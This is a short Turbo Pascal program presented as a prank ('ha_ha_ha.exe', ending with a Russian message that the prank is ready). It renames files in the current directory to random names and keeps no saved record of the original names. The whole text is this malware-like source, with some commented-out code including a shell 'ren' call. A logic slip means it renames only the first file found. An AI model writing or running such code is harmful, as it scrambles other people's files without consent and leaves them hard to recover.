{$M 5000,0,0}
uses WinDos, Dos, Crt;
const Symbols:string = '-_$#&@!%()}{~^''abcdefghijklmnopqrstuvwxyz0123456789';
var files:array[1..200] of
          record
            OldName:string[12];
            NewName:string[12]
          end;
    f,l,d,Total:integer;
    Ok:Boolean;
    TekDir:string;
    st:PathStr;
    Fil:SearchRec;
    Gogi:text;
    dir:dirstr;
    nam:namestr;
    ext:extstr;
begin
Randomize;
GetDir(0,TekDir);
st:=FSearch('ha_ha_ha.dat',TekDir);
if st='' then
  begin
    Total:=0;
    FindFirst('*.*',Archive,Fil);
    if DosError=0 then
      begin
        inc(Total);
        with Files[Total] do
          begin
            if Fil.Name<>'ha_ha_ha.exe' then
          begin
            {FSplit(Fil.name,dir,nam,ext);
            if (nam+ext)='' then begin {dec(total);}{findnext(fil) end;}
            OldName:=Fil.Name;
{            Assign(gogi,Fil.Name);
            GetFAttr(gogi,attr);
            if attr and faDirectory <> 0 then OldName:='igor.dat';}
            NewName:='';
            for f:=1 to 8 do
              NewName:=NewName+Symbols[Random(Length(Symbols))+1];
            NewName:=NewName+'.';
            for f:=1 to 3 do
              NewName:=NewName+Symbols[Random(Length(Symbols))+1];
            Assign(gogi,OldName);
            Rename(gogi,NewName);
            writeln(oldnaME);
{            SwapVectors;
            Exec(GetEnv('COMSPEC'),'/C ren '+OldName+' '+NewName);
            SwapVectors;}
          end;  
          end;
            FindNext(Fil)
      end;
  end;
writeln('Шутка готова!');
end.